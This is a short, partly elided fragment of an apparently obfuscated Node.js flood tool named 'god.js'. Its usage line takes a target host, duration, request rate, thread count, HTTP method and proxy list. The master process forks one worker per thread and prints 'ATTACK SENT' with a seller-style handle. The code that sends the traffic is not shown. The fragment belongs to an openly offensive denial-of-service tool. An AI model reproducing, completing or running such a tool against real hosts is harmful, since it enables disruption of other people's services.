...
process['argv']['length'] < 0x7 && (console['log']('Usage: node god.js host time req thread GET proxy.txt'), process['exit']());
...
if (cluster['isMaster']) for (let counter = 0x1; counter <= args['threads']; counter++) {
  console['clear'](), console['log']('ATTACK SENT'['bgRed']), console['log']('@stevenstoree'['blue']), cluster['fork']();
